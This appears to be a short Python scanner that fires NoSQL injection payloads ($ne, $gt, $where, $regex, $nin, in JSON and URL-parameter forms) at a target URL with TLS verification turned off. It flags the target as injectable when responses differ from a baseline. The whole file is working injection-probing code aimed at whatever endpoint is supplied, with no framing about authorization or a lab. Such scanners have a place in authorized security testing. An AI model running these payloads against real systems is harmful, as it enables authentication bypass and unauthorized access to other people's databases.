import httpx
import json

PAYLOADS = [
    ("JSON $ne", '{"$ne": ""}', True),
    ("JSON $gt", '{"$gt": ""}', True),
    ("URL $ne", "[$ne]=", False),
    ("URL $gt", "[$gt]=admin", False),
    ("JSON $where", '{"$where": "1==1"}', True),
    ("JSON $regex", '{"$regex": ".*"}', True),
    ("JSON $nin", '{"$nin": []}', True),
]


async def nosql_inject(target: str, param: str = "user") -> dict:
    results = []
    base = target.rstrip("/")
    async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
        resp_empty = await client.post(base, data={})
        base_status = resp_empty.status_code
        base_size = len(resp_empty.text)
        for name, payload, is_json in PAYLOADS:
            try:
                if is_json:
                    headers = {"Content-Type": "application/json"}
                    data_text = json.dumps({param: json.loads(payload)})
                    resp = await client.post(base, content=data_text, headers=headers)
                else:
                    resp = await client.post(base, data={f"{param}{payload}": ""})
                diff_status = resp.status_code != base_status
                diff_size = abs(len(resp.text) - base_size) > 20
                results.append({
                    "payload": name,
                    "content": payload,
                    "status": resp.status_code,
                    "diff_status": diff_status,
                    "diff_size": diff_size,
                    "suspicious": diff_status or diff_size,
                })
            except httpx.HTTPError as e:
                results.append({"payload": name, "error": str(e)})
    return {"target": target, "tests": results, "noSQL_injection_possible": any(r.get("suspicious") for r in results)}
